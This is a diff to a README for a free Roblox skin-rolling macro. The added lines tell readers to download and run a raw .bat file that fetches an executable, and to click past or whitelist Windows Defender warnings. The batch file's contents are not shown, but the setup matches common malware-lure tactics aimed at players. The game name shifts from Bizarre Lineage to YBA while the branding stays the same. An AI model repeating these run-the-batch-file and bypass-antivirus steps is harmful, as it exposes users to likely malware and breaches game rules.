@@ -1,7 +1,28 @@
+<div align="center">
+
 # 🎰 Stand Arrow Free Macro — Skin Pity Checker
 
 **Spins Stand Arrows automatically and stops the moment your worthiness hits 0 (= you got a skin!).**
 Free, no key needed, just download and run.
+
+![Version](https://img.shields.io/badge/version-1.0-purple?style=for-the-badge)
+![Platform](https://img.shields.io/badge/platform-Windows-blue?style=for-the-badge&logo=windows)
+![Status](https://img.shields.io/badge/status-Active-success?style=for-the-badge)
+![Price](https://img.shields.io/badge/price-FREE-brightgreen?style=for-the-badge)
+
+---
+
+## ⬇️ Download
+
+<a href="https://github.com/TheWolfLight/bizarre-lineage-bot/raw/main/Download_BizarreLineageSkin.bat">
+<img src="https://img.shields.io/badge/DOWNLOAD-MACRO-CBA6F7?style=for-the-badge&logo=download&logoColor=white" alt="Download">
+</a>
+
+<a href="https://discord.gg/YOUR_INVITE_HERE">
+<img src="https://img.shields.io/badge/JOIN-DISCORD-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
+</a>
+
+</div>
 
 ---
 
@@ -20,19 +41,22 @@ Free, no key needed, just download and run.
 
 ## 📥 Installation
 
-1. Download `StandArrowFreeMacro.zip` from the download link
-2. **Extract the zip** — you should get a folder with these 4 files:
+1. Click the **DOWNLOAD MACRO** button above
+2. Run the `.bat` file — it will auto-download `StandArrowFreeMacro.zip` to your Desktop
+3. **Extract the zip** — you should get a folder with these 4 files:
 
+   ```
    📁 StandArrowFreeMacro/
    ├── 🖥️ StandArrowFreeMacro.exe
    ├── 🖼️ worthiness_zero_ref.png
    ├── ⚙️ macro_config.json
    └── 📄 README.txt
+   ```
 
-3. **Keep all 4 files in the same folder!** The .exe needs the config and ref image next to it.
-4. Double-click `StandArrowFreeMacro.exe` to launch.
+4. **Keep all 4 files in the same folder!** The `.exe` needs the config and ref image next to it.
+5. Double-click `StandArrowFreeMacro.exe` to launch.
 
-> ⚠️ **Windows Defender may flag it** — that's normal for unsigned PyInstaller .exes. Click "More info" → "Run anyway" or whitelist the folder.
+> ⚠️ **Windows Defender may flag it** — that's normal for unsigned PyInstaller `.exes`. Click "More info" → "Run anyway" or whitelist the folder.
 
 ---
 
@@ -48,9 +72,9 @@ Free, no key needed, just download and run.
 
 ### Step-by-step
 
-1. **Open Roblox** and join bizarre lineage
+1. **Open Roblox** and join YBA (Your Bizarre Adventure)
 2. **Launch the macro** — Roblox will auto-resize and dock beside the macro window
-3. **Change your bizarre lineage inventory key** - Rebing ur inventory key in the bizarre lineage settings to J please it wont work if u dont do that
+3. **Press F2**, then **right-click on the zone** where you want the macro to click after spawning the arrow
 4. **(Optional)** check the worthiness "0" reference is captured — if not, set the worthiness corners and click `Capture '0'` while your worthiness *is* showing 0
 5. **Press F1** to start spinning!
 6. The macro will automatically stop when worthiness = 0 (= you got a skin)
@@ -59,6 +83,7 @@ Free, no key needed, just download and run.
 
 ## 🛠️ How It Works
 
+```
 Loop:
   → Press J (open inventory)
   → Click search bar
@@ -71,6 +96,7 @@ Loop:
   → Read worthiness number
   → If worthiness == 0 → STOP! 🎉
   → Else → loop again
+```
 
 The worthiness check works by **comparing the screen region against a saved "0" reference image** using:
 - 🔲 Binary thresholding
@@ -93,23 +119,35 @@ This makes it way more reliable than OCR for a single digit.
 > A: Re-capture the "0" reference: set the worthiness corners in the Positions tab, wait until your in-game worthiness *is* 0, then click `Capture '0'`.
 
 > **Q: Does this get me banned?**
-> A: You wont ever get banned because of it.
+> A: Use at your own risk. The macro uses hardware-level input so it's very hard to detect, but no automation is ever truly risk-free.
 
 > **Q: Can I run this on Mac/Linux?**
 > A: Windows only — uses Win32 APIs for the Roblox window management.
 
 > **Q: How do I get the paid version with stand/personality/skin filtering?**
-> A: DM me for info on the full version.
+> A: Join the [Discord server](https://discord.gg/YOUR_INVITE_HERE) for info on the full paid version.
 
 ---
 
 ## 🐛 Issues / Bugs?
 
-Drop a comment below or DM me. Include:
+Open a ticket in our [Discord server](https://discord.gg/YOUR_INVITE_HERE). Include:
 - Your screen resolution
 - A screenshot of the macro's status
 - What step it fails on
 
 ---
 
+## ⚠️ Disclaimer
+
+This is a third-party tool, not affiliated with Roblox or YBA. Use at your own risk. Don't blame me if you get banned, your stand gets stolen, or your dog runs away.
+
+---
+
+<div align="center">
+
 **Enjoy the free skins! 🎰✨**
+
+<sub>Made with 💜 by Bizarre Lineage Skin Team</sub>
+
+</div>
